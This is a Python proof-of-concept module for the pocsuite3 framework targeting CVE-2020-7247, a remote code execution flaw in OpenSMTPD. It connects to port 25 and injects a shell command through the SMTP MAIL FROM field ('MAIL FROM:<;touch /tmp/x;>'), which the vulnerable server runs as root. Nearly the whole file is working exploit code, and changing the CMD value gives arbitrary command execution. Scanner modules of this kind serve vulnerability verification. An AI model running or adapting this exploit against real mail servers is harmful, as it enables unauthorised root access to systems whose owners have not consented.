#!/usr/bin/python
# -*- coding: utf-8 -*-
import re
from pocsuite3.api import requests  # 用法和 requests 完全相同
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
import paramiko
from socket import *
poc_code = """

"""

class TestPOC(POCBase):
    name = 'liunx_cve-2020-7247'
    vulID = 'CVE-2020-7247'
    author = ['weihong','mfz']
    vulType = ''
    version = '1.1'  # default version: 1.0
    references = ['']
    desc = '''
		   该漏洞涉及了本地权限提升和远程代码执行，可被远程攻击者用来在目标服务器上以root权限执行任意代码。
		   '''
    vulDate = '2020-01-29'
    createDate = '2020-03-13'
    updateDate = '2020-11-26'
    appName = 'Liunx'
    appVersion = 'Linux OpenSMTPD >=6.4.0 < 6.6.2'
    appPowerLink = ''
    samples = ['']

    def _attack(self):
        '''attack mode'''
        return self._verify()
    def _verify(self):
        '''verify mode'''
        result = {}
        result1 = poc(self.url)
        if result1:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['IP'] = str(self.url)[7:] + ' CVE-2020-7247' + ' is exist!'
        return self.parse_output(result)
    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

def poc(url):
    a=True
    ADDR = str(url)[7:]
    PORT = int(25)
    CMD = b"touch /tmp/x"

    s = socket(AF_INET, SOCK_STREAM)
    s.connect((ADDR, PORT))

    res = s.recv(1024)
    if 'OpenSMTPD' not in str(res):
        #print('[!] No OpenSMTPD detected')
        #print('[!] Received {}'.format(str(res)))
        #print('[!] Exiting...')
        a=False
        #sys.exit(1)

    #print('[*] OpenSMTPD detected')
    s.send(b'HELO x\r\n')
    res = s.recv(1024)
    if '250' not in str(res):
        #print('[!] Error connecting, expected 250')
        #print('[!] Received: {}'.format(str(res)))
        #print('[!] Exiting...')
        a=False
        #sys.exit(1)
    # https://www.qualys.com/2020/02/24/cve-2020-8794/lpe-rce-opensmtpd-default-install.txt
    #print('[*] Connected, sending payload')
    # s.send(bytes('MAIL FROM:<;{};>\r\n'.format(CMD),'utf-8'))
    # s.send(bytes(f'MAIL FROM:<;{};>\r\n'.format(CMD)))
    s.send((b'MAIL FROM:<;' + CMD + b';>\r\n'))
    # print bytes('MAIL FROM:<;{};>\r\n'.format(CMD))
    res = s.recv(1024)
    if '250' not in str(res):
        #sys.exit(1)
        a=False
    s.send(b'RCPT TO:<root>\r\n')
    s.recv(1024)
    s.send(b'DATA\r\n')
    s.recv(1024)
    s.send(b'\r\nxxx\r\n.\r\n')
    s.recv(1024)
    s.send(b'QUIT\r\n')
    s.recv(1024)
    return a


register_poc(TestPOC)
